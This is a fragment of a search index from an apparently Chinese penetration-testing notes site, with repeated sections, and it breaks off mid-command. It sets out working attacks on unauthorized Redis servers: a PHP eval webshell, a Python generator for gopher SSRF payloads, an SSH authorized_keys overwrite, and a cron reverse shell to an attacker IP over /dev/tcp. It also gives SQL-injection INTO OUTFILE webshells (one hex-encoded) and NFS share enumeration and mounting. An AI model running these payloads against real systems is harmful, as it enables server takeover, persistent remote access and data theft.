\u662fhttp\u534f\u8bae\u51fa\u73b0\u5e38\u7528\u7684\u4e00\u4e2a\u534f\u8bae\uff0cSSRF\u7684\u4e07\u91d1\u6cb9\u3002 \u683c\u5f0f\uff1agopher://IP:port/ _{TCP/IP\u6570\u636e\u6d41} \u5982\u4f55redis\u8fdc\u7a0b\u94fe\u63a5 redis-cli -h ip -p port xxx.xxx.xxx.xxx:x>AUTH \"password\" (\u672a\u6388\u6743\u5c31\u4e0d\u9700\u8981\u8f93\u5165\u5bc6\u7801) \u653b\u51fb\u65b9\u6cd5\u4e00:\u5199shell \u5199shell\u7684\u8bdd,redis\u9700\u6267\u884c\u7684\u547d\u4ee4\u5e94\u8be5\u7c7b\u4f3c\u8fd9\u6837 \u5982\u679c\u4f60\u80fd\u76f4\u63a5redis -h ip -n 6379 \u672a\u6388\u6743\u8fde\u63a5\u4e0aredis\u670d\u52a1\u5668\u4e14\u6743\u9650\u591f\u9ad8\uff0c\u53ef\u4ee5\u76f4\u63a5\u8f93\u5165\u4ee5\u4e0b\u547d\u4ee4 flushall //\u6e05\u7a7a\u6570\u636e\u5e93 set 1 '<?php eval($_GET[\"cmd\"]);?>' //\u4e3a\u952e\u540d\u4e3a1\u7684\u952e\u8d4b\u503c config set dir /var/www/html config set dbfilename shell.php //\u8bbe\u7f6e\u6570\u636e\u5b58\u50a8\u5230\u78c1\u76d8\u65f6\u7684\u6587\u4ef6\u8def\u5f84 save //\u6570\u636e\u5e93\u5168\u90e8\u4fdd\u5b58\u81f3\u78c1\u76d8 \u653b\u51fb\u811a\u672c\u5982\u4e0b(\u4e3b\u8981\u7528\u4e8essrf) #python3 import urllib protocol=\"gopher://\" ip=\"192.168.163.128\" port=\"6379\" shell=\"\\n\\n<?php eval($_GET[\\\"cmd\\\"]);?>\\n\\n\" filename=\"shell.php\" path=\"/var/www/html\" passwd=\"\" cmd=[\"flushall\", \"set 1 {}\".format(shell.replace(\" \",\"${IFS}\")),//\u8fd9\u91cc\u7684IFS\u66ff\u6362\u4e0d\u662f\u5f88\u7406\u89e3\u662f\u5565\u610f\u601d.. \"config set dir {}\".format(path), \"config set dbfilename {}\".format(filename), \"save\" ] if passwd: cmd.insert(0,\"AUTH {}\".format(passwd)) //\u5982\u679c\u9700\u8981\u5bc6\u7801\uff0c\u5c31\u628a\u5bc6\u7801\u8f93\u5165\u547d\u4ee4\u52a0\u5165\u5230cmd\u7b2c\u4e00\u4f4d payload=protocol+ip+\":\"+port+\"/_\" def redis_format(arr): CRLF=\"\\r\\n\" redis_arr = arr.split(\" \") cmd=\"\" cmd+=\"*\"+str(len(redis_arr)) for x in redis_arr: cmd+=CRLF+\"$\"+str(len((x.replace(\"${IFS}\",\" \"))))+CRLF+x.replace(\"${IFS}\",\" \") cmd+=CRLF return cmd if __name__==\"__main__\": for x in cmd: payload += urllib.quote(redis_format(x)) print(payload) \u8fd9\u6837\u7684\u8bdd\uff0c\u6211\u4eec\u5c31\u5f97\u5230\u4e86payload\uff0c\u76f4\u63a5curl\u4e00\u4e0b\uff0c\u5c31\u5199\u5165shell\u4e86 \u653b\u51fb\u65b9\u6cd5\u4e8c:info\u83b7\u53d6\u654f\u611f\u4fe1\u606f \u8fde\u4e0a\u540e \u4f7f\u7528info\u547d\u4ee4 \u653b\u51fb\u65b9\u6cd5\u4e09\uff1a\u5199\u5165ssh\u516c\u94a5 \u9ad8\u7248\u672c\u4e0d\u597d\u7528\uff0c\u56e0\u4e3a\u9ad8\u7248\u672c\u7684redis\u6743\u9650\u662f\u65e0\u6cd5\u5f80/root\u76ee\u5f55\u5199\u5165\u7684. \u800c\u8fd9\u4e2a\u65b9\u6cd5\u5219\u9700\u8981\u5f80/root/.ssh\u5199\u5165ssh\u516c\u94a5\u8fbe\u5230\u65e0\u5bc6\u7801ssh\u94fe\u63a5\u7684\u76ee\u7684 \u9996\u5148\u5728\u653b\u51fb\u673a\u4e0a\u751f\u6210\u4e00\u5bf9\u4e0d\u9700\u8981\u5bc6\u7801\u7684\u516c\u94a5\u79c1\u94a5 \u7136\u540e\u4f9d\u6b21\u8f93\u5165 config set dir /root/.ssh config set dirfilename authorized_keys save \u7136\u540essh\u514d\u5bc6\u767b\u5f55 ssh -i id_rsa root\\@ip \u653b\u51fb\u65b9\u6cd5\u56db\uff1a\u5229\u7528cron\u8ba1\u5212\u4efb\u52a1\u53cd\u5f39shell \u4ec5\u5728centos\u7cfb\u7edf\u594f\u6548\uff0cUbuntu\u4e0d\u884c \u56e0\u4e3a\u9ed8\u8ba4redis\u5199\u6587\u4ef6\u540e\u662f644\u7684\u6743\u9650\uff0c\u4f46ubuntu\u8981\u6c42\u6267\u884c\u5b9a\u65f6\u4efb\u52a1\u6587\u4ef6 /var/spool/cron/crontabs/ \u6743\u9650\u5fc5\u987b\u662f600\u4e5f\u5c31\u662f -rw------- \u624d\u4f1a\u6267\u884c\uff0c\u5426\u5219\u4f1a\u62a5\u9519 (root) INSECURE MODE (mode 0600 expected) \uff0c\u800cCentos\u7684\u5b9a\u65f6\u4efb\u52a1\u6587\u4ef6 /var/spool/cron/ \u6743\u9650644\u4e5f\u80fd\u6267\u884c \u56e0\u4e3aredis\u4fdd\u5b58RDB\u4f1a\u5b58\u5728\u4e71\u7801\uff0c\u5728Ubuntu\u4e0a\u4f1a\u62a5\u9519\uff0c\u800c\u5728Centos\u4e0a\u4e0d\u4f1a\u62a5\u9519 \u7531\u4e8e\u7cfb\u7edf\u7684\u4e0d\u540c\uff0ccrontrab\u5b9a\u65f6\u6587\u4ef6\u4f4d\u7f6e\u4e5f\u4f1a\u4e0d\u540c Centos\u7684\u5b9a\u65f6\u4efb\u52a1\u6587\u4ef6\u5728 /var/spool/cron/ Ubuntu\u5b9a\u65f6\u4efb\u52a1\u6587\u4ef6\u5728 /var/spool/cron/crontabs/ Centos\u548cUbuntu\u5747\u5b58\u5728\u7684\uff08\u9700\u8981root\u6743\u9650\uff09 /etc/crontab PS\uff1a\u9ad8\u7248\u672c\u7684redis\u9ed8\u8ba4\u542f\u52a8\u662f redis \u6743\u9650\uff0c\u6545\u5199\u8fd9\u4e2a\u6587\u4ef6\u662f\u884c\u4e0d\u901a\u7684 \u547d\u4ee4\u5982\u4e0b set x \"\\n* * * * * bash -i >& /dev/tcp/192.168.242.131/888 0>&1\\n\" config set dir /var/spool/cron/ config set dbfilename root save \u628a\u4e0a\u9762\u90a3\u4e2a\u811a\u672c\u6539\u6539\u5c31\u80fd\u5b9e\u73b0ssrf\u4e86","title":"redis\u7684\u4e00\u4e9b\u653b\u51fb\u65b9\u5f0f"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%95%B0%E6%8D%AE%E5%BA%93/redis%E7%9A%84%E4%B8%80%E4%BA%9B%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/redis%E7%9A%84%E4%B8%80%E4%BA%9B%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/#redis","text":"","title":"redis\u7684\u4e00\u4e9b\u653b\u51fb\u65b9\u5f0f"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%95%B0%E6%8D%AE%E5%BA%93/redis%E7%9A%84%E4%B8%80%E4%BA%9B%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/redis%E7%9A%84%E4%B8%80%E4%BA%9B%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/#_1","text":"RESP\u534f\u8bae gopher\u534f\u8bae \u5982\u4f55redis\u8fdc\u7a0b\u94fe\u63a5 \u653b\u51fb\u65b9\u6cd5\u4e00:\u5199shell \u653b\u51fb\u65b9\u6cd5\u4e8c:info\u83b7\u53d6\u654f\u611f\u4fe1\u606f \u653b\u51fb\u65b9\u6cd5\u4e09\uff1a\u5199\u5165ssh\u516c\u94a5 \u653b\u51fb\u65b9\u6cd5\u56db\uff1a\u5229\u7528cron\u8ba1\u5212\u4efb\u52a1\u53cd\u5f39shell \u53c2\u8003 https://www.redteaming.top/2019/07/15/%E6%B5%85%E6%9E%90Redis%E4%B8%ADSSRF%E7%9A%84%E5%88%A9%E7%94%A8/ Redis\u9ed8\u8ba4\u7aef\u53e36379 \u5982\u679c\u5b58\u5728\u672a\u6388\u6743\u95ee\u9898\uff0c\u90a3\u4e48\u4efb\u4f55\u4eba\u90fd\u53ef\u4ee5\u5f80\u8fd9\u53f0Redis\u670d\u52a1\u5668\u4e0a\u4f20\u8f93\u547d\u4ee4 \u4e00\u822cRedis\u653b\u51fb\u6709 \u5199shell\uff08\u6700\u5e38\u7528\uff09\uff0c\u5199\u5bc6\u94a5\uff0c\u5199crontab\u53cd\u5f39shell, info\u83b7\u5f97\u654f\u611f\u4fe1\u606f,\u5176\u4e2d\u5199\u5bc6\u94a5\u548c\u5199crontab\u4e0d\u662f\u90a3\u4e48\u7684\u597d\u7528 \u5728\u8bb2\u653b\u51fb\u4e4b\u524d\uff0c\u8981\u8bb2\u4e00\u4e0bRESP\u534f\u8bae","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%95%B0%E6%8D%AE%E5%BA%93/redis%E7%9A%84%E4%B8%80%E4%BA%9B%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/redis%E7%9A%84%E4%B8%80%E4%BA%9B%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/#resp","text":"Redis\u670d\u52a1\u5668\u4e0e\u5ba2\u6237\u7aef\u901a\u8fc7RESP\u534f\u8bae\u7684\u901a\u4fe1\u3002 resp\u534f\u8bae\u4eceredis1.2\u5f15\u5165\u3002 \u8fd9\u4e2a\u534f\u8bae\u628a\u670d\u52a1\u5668\u4e0e\u5ba2\u6237\u7aef\u4e4b\u95f4\u7684\u6570\u636e\u4ee5\u4e00\u79cd\u5e8f\u5217\u5316\u7684\u5f62\u5f0f\u5904\u7406\u5e76\u4f20\u8f93 \u5728RESP\u4e2d\uff0c\u67d0\u4e9b\u6570\u636e\u7684\u7c7b\u578b\u53d6\u51b3\u4e8e\u7b2c\u4e00\u4e2a\u5b57\u8282\uff1a \u5bf9\u4e8e Simple Strings \uff0c\u56de\u590d\u7684\u7b2c\u4e00\u4e2a\u5b57\u8282\u662f + \u5bf9\u4e8e error \uff0c\u56de\u590d\u7684\u7b2c\u4e00\u4e2a\u5b57\u8282\u662f - \u5bf9\u4e8e Integer \uff0c\u56de\u590d\u7684\u7b2c\u4e00\u4e2a\u5b57\u8282\u662f : \u5bf9\u4e8e Bulk Strings \uff0c\u56de\u590d\u7684\u7b2c\u4e00\u4e2a\u5b57\u8282\u662f $ \uff0c\u53d1\u9001\u7ed9\u670d\u52a1\u5668\u7684\u547d\u4ee4\u5c31\u662f\u653e\u5728\u6570\u7ec4\u4e2d\u7684BulkStrings\u7c7b\u578b \u5bf9\u4e8e array \uff0c\u56de\u590d\u7684\u7b2c\u4e00\u4e2a\u5b57\u8282\u662f * \u6b64\u5916\uff0c RESP \u80fd\u591f\u4f7f\u7528\u7a0d\u540e\u6307\u5b9a\u7684 Bulk Strings \u6216 Array \u7684\u7279\u6b8a\u53d8\u4f53\u6765\u8868\u793a Null \u503c\u3002 \u5728RESP\u4e2d\uff0c\u534f\u8bae\u7684\u4e0d\u540c\u90e8\u5206\u59cb\u7ec8\u4ee5 \"\\r\\n\"(CRLF) \u7ed3\u675f\u3002 \u540c\u65f6\u6bcf\u4e2a\u7c7b\u578b\u5b57\u8282\u540e\u7d27\u8ddf\u7740\u8be5\u7c7b\u578b\u7684\u957f\u5ea6\uff0c\u7136\u540e\u662fCRLF\uff0c\u7136\u540e\u662f\u8be5\u7c7b\u578b\u7684\u503c \u8bf4\u4e86\u8fd9\u4e48\u591a\uff0c\u80af\u5b9a\u4e0d\u4f1a\u5f88\u61c2\uff0c\u4e0a\u56fe \u5373\u53d1\u9001\u7684\u65f6\u5019\uff0c\u662f\u7528\u4e09\u4e2a\u5143\u7d20\u7684\u6570\u7ec4(*3),\u7b2c\u4e00\u4e2a\u5143\u7d20\u662f\u4e09\u4e2a\u957f\u5ea6\u7684BulkString($3)\u5176\u503c\u4e3aset,\u7b2c\u4e8c\u4e2a\u5143\u7d20\u662f\u56db\u4e2a\u957f\u5ea6\u7684BulkSting($4)\u5176\u503c\u4e3aname,\u7b2c\u4e09\u4e2a\u5143\u7d20\u662f\u56db\u4e2a\u957f\u5ea6\u957f\u7684BulkString(\\$4)\u5176\u503c\u4e3atest,\u670d\u52a1\u5668\u8fd4\u56deSimpleString\uff08+\uff09OK\uff0c\u4ee5\u4e0b\u7c7b\u63a8","title":"RESP\u534f\u8bae"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%95%B0%E6%8D%AE%E5%BA%93/redis%E7%9A%84%E4%B8%80%E4%BA%9B%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/redis%E7%9A%84%E4%B8%80%E4%BA%9B%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/#gopher","text":"\u662fhttp\u534f\u8bae\u51fa\u73b0\u5e38\u7528\u7684\u4e00\u4e2a\u534f\u8bae\uff0cSSRF\u7684\u4e07\u91d1\u6cb9\u3002 \u683c\u5f0f\uff1agopher://IP:port/ _{TCP/IP\u6570\u636e\u6d41}","title":"gopher\u534f\u8bae"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%95%B0%E6%8D%AE%E5%BA%93/redis%E7%9A%84%E4%B8%80%E4%BA%9B%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/redis%E7%9A%84%E4%B8%80%E4%BA%9B%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/#redis_1","text":"redis-cli -h ip -p port xxx.xxx.xxx.xxx:x>AUTH \"password\" (\u672a\u6388\u6743\u5c31\u4e0d\u9700\u8981\u8f93\u5165\u5bc6\u7801)","title":"\u5982\u4f55redis\u8fdc\u7a0b\u94fe\u63a5"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%95%B0%E6%8D%AE%E5%BA%93/redis%E7%9A%84%E4%B8%80%E4%BA%9B%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/redis%E7%9A%84%E4%B8%80%E4%BA%9B%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/#shell","text":"\u5199shell\u7684\u8bdd,redis\u9700\u6267\u884c\u7684\u547d\u4ee4\u5e94\u8be5\u7c7b\u4f3c\u8fd9\u6837 \u5982\u679c\u4f60\u80fd\u76f4\u63a5redis -h ip -n 6379 \u672a\u6388\u6743\u8fde\u63a5\u4e0aredis\u670d\u52a1\u5668\u4e14\u6743\u9650\u591f\u9ad8\uff0c\u53ef\u4ee5\u76f4\u63a5\u8f93\u5165\u4ee5\u4e0b\u547d\u4ee4 flushall //\u6e05\u7a7a\u6570\u636e\u5e93 set 1 '<?php eval($_GET[\"cmd\"]);?>' //\u4e3a\u952e\u540d\u4e3a1\u7684\u952e\u8d4b\u503c config set dir /var/www/html config set dbfilename shell.php //\u8bbe\u7f6e\u6570\u636e\u5b58\u50a8\u5230\u78c1\u76d8\u65f6\u7684\u6587\u4ef6\u8def\u5f84 save //\u6570\u636e\u5e93\u5168\u90e8\u4fdd\u5b58\u81f3\u78c1\u76d8 \u653b\u51fb\u811a\u672c\u5982\u4e0b(\u4e3b\u8981\u7528\u4e8essrf) #python3 import urllib protocol=\"gopher://\" ip=\"192.168.163.128\" port=\"6379\" shell=\"\\n\\n<?php eval($_GET[\\\"cmd\\\"]);?>\\n\\n\" filename=\"shell.php\" path=\"/var/www/html\" passwd=\"\" cmd=[\"flushall\", \"set 1 {}\".format(shell.replace(\" \",\"${IFS}\")),//\u8fd9\u91cc\u7684IFS\u66ff\u6362\u4e0d\u662f\u5f88\u7406\u89e3\u662f\u5565\u610f\u601d.. \"config set dir {}\".format(path), \"config set dbfilename {}\".format(filename), \"save\" ] if passwd: cmd.insert(0,\"AUTH {}\".format(passwd)) //\u5982\u679c\u9700\u8981\u5bc6\u7801\uff0c\u5c31\u628a\u5bc6\u7801\u8f93\u5165\u547d\u4ee4\u52a0\u5165\u5230cmd\u7b2c\u4e00\u4f4d payload=protocol+ip+\":\"+port+\"/_\" def redis_format(arr): CRLF=\"\\r\\n\" redis_arr = arr.split(\" \") cmd=\"\" cmd+=\"*\"+str(len(redis_arr)) for x in redis_arr: cmd+=CRLF+\"$\"+str(len((x.replace(\"${IFS}\",\" \"))))+CRLF+x.replace(\"${IFS}\",\" \") cmd+=CRLF return cmd if __name__==\"__main__\": for x in cmd: payload += urllib.quote(redis_format(x)) print(payload) \u8fd9\u6837\u7684\u8bdd\uff0c\u6211\u4eec\u5c31\u5f97\u5230\u4e86payload\uff0c\u76f4\u63a5curl\u4e00\u4e0b\uff0c\u5c31\u5199\u5165shell\u4e86","title":"\u653b\u51fb\u65b9\u6cd5\u4e00:\u5199shell"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%95%B0%E6%8D%AE%E5%BA%93/redis%E7%9A%84%E4%B8%80%E4%BA%9B%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/redis%E7%9A%84%E4%B8%80%E4%BA%9B%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/#info","text":"\u8fde\u4e0a\u540e \u4f7f\u7528info\u547d\u4ee4","title":"\u653b\u51fb\u65b9\u6cd5\u4e8c:info\u83b7\u53d6\u654f\u611f\u4fe1\u606f"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%95%B0%E6%8D%AE%E5%BA%93/redis%E7%9A%84%E4%B8%80%E4%BA%9B%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/redis%E7%9A%84%E4%B8%80%E4%BA%9B%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/#ssh","text":"\u9ad8\u7248\u672c\u4e0d\u597d\u7528\uff0c\u56e0\u4e3a\u9ad8\u7248\u672c\u7684redis\u6743\u9650\u662f\u65e0\u6cd5\u5f80/root\u76ee\u5f55\u5199\u5165\u7684. \u800c\u8fd9\u4e2a\u65b9\u6cd5\u5219\u9700\u8981\u5f80/root/.ssh\u5199\u5165ssh\u516c\u94a5\u8fbe\u5230\u65e0\u5bc6\u7801ssh\u94fe\u63a5\u7684\u76ee\u7684 \u9996\u5148\u5728\u653b\u51fb\u673a\u4e0a\u751f\u6210\u4e00\u5bf9\u4e0d\u9700\u8981\u5bc6\u7801\u7684\u516c\u94a5\u79c1\u94a5 \u7136\u540e\u4f9d\u6b21\u8f93\u5165 config set dir /root/.ssh config set dirfilename authorized_keys save \u7136\u540essh\u514d\u5bc6\u767b\u5f55 ssh -i id_rsa root\\@ip","title":"\u653b\u51fb\u65b9\u6cd5\u4e09\uff1a\u5199\u5165ssh\u516c\u94a5"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%95%B0%E6%8D%AE%E5%BA%93/redis%E7%9A%84%E4%B8%80%E4%BA%9B%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/redis%E7%9A%84%E4%B8%80%E4%BA%9B%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/#cronshell","text":"\u4ec5\u5728centos\u7cfb\u7edf\u594f\u6548\uff0cUbuntu\u4e0d\u884c \u56e0\u4e3a\u9ed8\u8ba4redis\u5199\u6587\u4ef6\u540e\u662f644\u7684\u6743\u9650\uff0c\u4f46ubuntu\u8981\u6c42\u6267\u884c\u5b9a\u65f6\u4efb\u52a1\u6587\u4ef6 /var/spool/cron/crontabs/ \u6743\u9650\u5fc5\u987b\u662f600\u4e5f\u5c31\u662f -rw------- \u624d\u4f1a\u6267\u884c\uff0c\u5426\u5219\u4f1a\u62a5\u9519 (root) INSECURE MODE (mode 0600 expected) \uff0c\u800cCentos\u7684\u5b9a\u65f6\u4efb\u52a1\u6587\u4ef6 /var/spool/cron/ \u6743\u9650644\u4e5f\u80fd\u6267\u884c \u56e0\u4e3aredis\u4fdd\u5b58RDB\u4f1a\u5b58\u5728\u4e71\u7801\uff0c\u5728Ubuntu\u4e0a\u4f1a\u62a5\u9519\uff0c\u800c\u5728Centos\u4e0a\u4e0d\u4f1a\u62a5\u9519 \u7531\u4e8e\u7cfb\u7edf\u7684\u4e0d\u540c\uff0ccrontrab\u5b9a\u65f6\u6587\u4ef6\u4f4d\u7f6e\u4e5f\u4f1a\u4e0d\u540c Centos\u7684\u5b9a\u65f6\u4efb\u52a1\u6587\u4ef6\u5728 /var/spool/cron/ Ubuntu\u5b9a\u65f6\u4efb\u52a1\u6587\u4ef6\u5728 /var/spool/cron/crontabs/ Centos\u548cUbuntu\u5747\u5b58\u5728\u7684\uff08\u9700\u8981root\u6743\u9650\uff09 /etc/crontab PS\uff1a\u9ad8\u7248\u672c\u7684redis\u9ed8\u8ba4\u542f\u52a8\u662f redis \u6743\u9650\uff0c\u6545\u5199\u8fd9\u4e2a\u6587\u4ef6\u662f\u884c\u4e0d\u901a\u7684 \u547d\u4ee4\u5982\u4e0b set x \"\\n* * * * * bash -i >& /dev/tcp/192.168.242.131/888 0>&1\\n\" config set dir /var/spool/cron/ config set dbfilename root save \u628a\u4e0a\u9762\u90a3\u4e2a\u811a\u672c\u6539\u6539\u5c31\u80fd\u5b9e\u73b0ssrf\u4e86","title":"\u653b\u51fb\u65b9\u6cd5\u56db\uff1a\u5229\u7528cron\u8ba1\u5212\u4efb\u52a1\u53cd\u5f39shell"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%95%B0%E6%8D%AE%E5%BA%93/sql%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5/","text":"sql\u6ce8\u5165 \u76ee\u5f55 getshell into outfile into outfile\uff08hex\uff09 getshell into outfile show global variables like '%secure%'; secure_file_priv\u7684\u503c\u4e3anull \uff0c\u8868\u793a\u9650\u5236mysqld \u4e0d\u5141\u8bb8\u5bfc\u5165|\u5bfc\u51fa \u5f53secure_file_priv\u7684\u503c\u4e3a/tmp/ \uff0c\u8868\u793a\u9650\u5236mysqld \u7684\u5bfc\u5165|\u5bfc\u51fa\u53ea\u80fd\u53d1\u751f\u5728/tmp/\u76ee\u5f55\u4e0b \u5f53secure_file_priv\u7684\u503c\u6ca1\u6709\u5177\u4f53\u503c\u65f6\uff0c\u8868\u793a\u4e0d\u5bf9mysqld \u7684\u5bfc\u5165|\u5bfc\u51fa\u505a\u9650\u5236 select '\\<?php eval(\\$_POST[yyj]);?>' into outfile \"C/phpstudy/www/shell.php\"; into outfile\uff08hex\uff09 union select 1,0x3c3f706870206576616c28245f524551554553545b315d293b3f3e,3 into outfile 'C:\\xxxxxx\\phpStudy\\WWW\\outfile.php' \u5176\u4e2d0x3c3f706870206576616c28245f524551554553545b315d293b3f3e\u662f\\<?php eval(\\$_REQUEST[123]);?> \u7684hex\u7f16\u7801","title":"sql\u6ce8\u5165"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%95%B0%E6%8D%AE%E5%BA%93/sql%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5/#sql","text":"","title":"sql\u6ce8\u5165"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%95%B0%E6%8D%AE%E5%BA%93/sql%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5/#_1","text":"getshell into outfile into outfile\uff08hex\uff09","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%95%B0%E6%8D%AE%E5%BA%93/sql%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5/#getshell","text":"","title":"getshell"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%95%B0%E6%8D%AE%E5%BA%93/sql%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5/#into-outfile","text":"show global variables like '%secure%'; secure_file_priv\u7684\u503c\u4e3anull \uff0c\u8868\u793a\u9650\u5236mysqld \u4e0d\u5141\u8bb8\u5bfc\u5165|\u5bfc\u51fa \u5f53secure_file_priv\u7684\u503c\u4e3a/tmp/ \uff0c\u8868\u793a\u9650\u5236mysqld \u7684\u5bfc\u5165|\u5bfc\u51fa\u53ea\u80fd\u53d1\u751f\u5728/tmp/\u76ee\u5f55\u4e0b \u5f53secure_file_priv\u7684\u503c\u6ca1\u6709\u5177\u4f53\u503c\u65f6\uff0c\u8868\u793a\u4e0d\u5bf9mysqld \u7684\u5bfc\u5165|\u5bfc\u51fa\u505a\u9650\u5236 select '\\<?php eval(\\$_POST[yyj]);?>' into outfile \"C/phpstudy/www/shell.php\";","title":"into outfile"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%95%B0%E6%8D%AE%E5%BA%93/sql%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5/#into-outfilehex","text":"union select 1,0x3c3f706870206576616c28245f524551554553545b315d293b3f3e,3 into outfile 'C:\\xxxxxx\\phpStudy\\WWW\\outfile.php' \u5176\u4e2d0x3c3f706870206576616c28245f524551554553545b315d293b3f3e\u662f\\<?php eval(\\$_REQUEST[123]);?> \u7684hex\u7f16\u7801","title":"into outfile\uff08hex\uff09"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%9C%8D%E5%8A%A1%E7%B1%BB/%E6%9C%8D%E5%8A%A1%E7%B1%BB/","text":"\u670d\u52a1\u7c7b NFS RCSYNC","title":"\u670d\u52a1\u7c7b"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%9C%8D%E5%8A%A1%E7%B1%BB/%E6%9C%8D%E5%8A%A1%E7%B1%BB/#_1","text":"NFS RCSYNC","title":"\u670d\u52a1\u7c7b"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%9C%8D%E5%8A%A1%E7%B1%BB/NFS/NFS/","text":"NFS \u76ee\u5f55 \u68c0\u6d4b \u68c0\u6d4b\u670d\u52a1\u662f\u5426\u5b58\u5728 msf showmount NFSSHELL \u5229\u7528 NFS\uff08Network File System\uff09\u5373\u7f51\u7edc\u6587\u4ef6\u7cfb\u7edf\uff0c\u662fFreeBSD\u652f\u6301\u7684\u6587\u4ef6\u7cfb\u7edf\u4e2d\u7684\u4e00\u79cd\uff0c\u5b83\u5141\u8bb8\u7f51\u7edc\u4e2d\u7684\u8ba1\u7b97\u673a\u4e4b\u95f4\u901a\u8fc7TCP/IP\u7f51\u7edc\u5171\u4eab\u8d44\u6e90\u3002\u5728NFS\u7684\u5e94\u7528\u4e2d\uff0c\u672c\u5730NFS\u7684\u5ba2\u6237\u7aef\u5e94\u7528\u53ef\u4ee5\u900f\u660e\u5730\u8bfb\u5199\u4f4d\u4e8e\u8fdc\u7aefNFS\u670d\u52a1\u5668\u4e0a\u7684\u6587\u4ef6\uff0c\u5c31\u50cf\u8bbf\u95ee\u672c\u5730\u6587\u4ef6\u4e00\u6837\u3002\u5982\u4ecaNFS\u5177\u5907\u4e86\u9632\u6b62\u88ab\u5229\u7528\u5bfc\u51fa\u6587\u4ef6\u5939\u7684\u529f\u80fd\uff0c\u4f46\u9057\u7559\u7cfb\u7edf\u4e2d\u7684NFS\u670d\u52a1\u914d\u7f6e\u4e0d\u5f53\uff0c\u5219\u4ecd\u53ef\u80fd\u906d\u5230\u6076\u610f\u653b\u51fb\u8005\u7684\u5229\u7528\u3002 \u68c0\u6d4b \u68c0\u6d4b\u670d\u52a1\u662f\u5426\u5b58\u5728 \u9ed8\u8ba4\u7aef\u53e32049\uff0c\u6b64\u5916\u6211\u4eec\u4e5f\u53ef\u4ee5\u901a\u8fc7rpcinfo\u6765\u5224\u65ad\u76ee\u6807\u4e3b\u673a\u662f\u5426\u5f00\u542fNFS\u670d\u52a1\uff08\u4f7f\u7528rpcinfo\u9700\u8981\u76ee\u6807\u673a\u5668\u5f00\u542f111 rpcbind\u7aef\u53e3\uff09 msf auxiliary/scanner/nfs/nfsmount msf\u53ef\u4ee5\u6279\u91cf\u8dd1\u8fd8\u662f\u53ef\u4ee5\u3002 set rhosts file:/root/url.txt showmount showmount IP // \u8fde\u63a5\u7684\u4e3b\u673a showmount -d IP // \u76ee\u5f55 showmount -a IP // \u6302\u8f7d\u70b9 NFSSHELL \u63a8\u8350linux\u4e0b\u4f7f\u7528 https://github.com/NetDirect/nfsshell apt-get install libreadline-dev libncurses5-dev make gcc -g -o nfsshell mount_clnt.o mount_xdr.o nfs_prot_clnt.o nfs_prot_xdr.o nfsshell.o -L/usr/local/lib -lreadline -lhistory -lncurses ./nfsshell nfs> host IP // \u8fde\u63a5NFS\u670d\u52a1 nfs> export // \u5bfc\u51faNFS\u5217\u8868 \u5229\u7528 \u5982\u679c\u6709\u5171\u4eab\u76ee\u5f55\uff0c\u5c31\u76f4\u63a5\u6302\u8f7d\u5230\u672c\u5730\u76ee\u5f55 mkdir /temp/ mount -t nfs 